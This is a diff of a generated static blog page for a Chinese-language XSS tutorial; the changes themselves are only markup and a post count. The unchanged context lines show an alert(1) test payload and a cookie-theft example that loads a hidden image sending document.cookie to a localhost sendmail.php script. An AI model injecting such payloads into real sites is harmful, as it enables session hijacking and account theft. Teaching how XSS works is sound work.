@@ -161,7 +161,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">159</span>
+          <span class="site-state-item-count">161</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -260,9 +260,9 @@
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <span id="more"></span>
 <h3><span id="fan-she-xing-xss">反射型 XSS</span><a href="#fan-she-xing-xss" class="header-anchor">#</a></h3>
-<p><img data-src="/img/msb/17376208071206.png" alt></p>
+<figure><img data-src="/img/msb/17376208071206.png" alt></figure>
 <h3><span id="cun-chu-xing-chi-jiu-xing-xss">存储型（持久型）XSS</span><a href="#cun-chu-xing-chi-jiu-xing-xss" class="header-anchor">#</a></h3>
-<p><img data-src="/img/msb/17376210736185.png" alt></p>
+<figure><img data-src="/img/msb/17376210736185.png" alt></figure>
 <h3><span id="shi-li-huo-qu-cookie-fa-song-you-jian">实例：获取 Cookie 发送邮件</span><a href="#shi-li-huo-qu-cookie-fa-song-you-jian" class="header-anchor">#</a></h3>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(‘img’);</span><br><span class="line">img.<span class="property">width</span> = <span class="number">0</span>;</span><br><span class="line">img.<span class="property">height</span> = <span class="number">0</span>;</span><br><span class="line">img.<span class="property">src</span> = ‘<span class="attr">http</span>:<span class="comment">//localhost/xss/sendmail.php?mycookie=‘+encodeURIComponent(document.cookie); </span></span><br></pre></td></tr></table></figure>
 <h2><span id="xss-jian-ce-he-li-yong">XSS 检测和利用</span><a href="#xss-jian-ce-he-li-yong" class="header-anchor">#</a></h2>
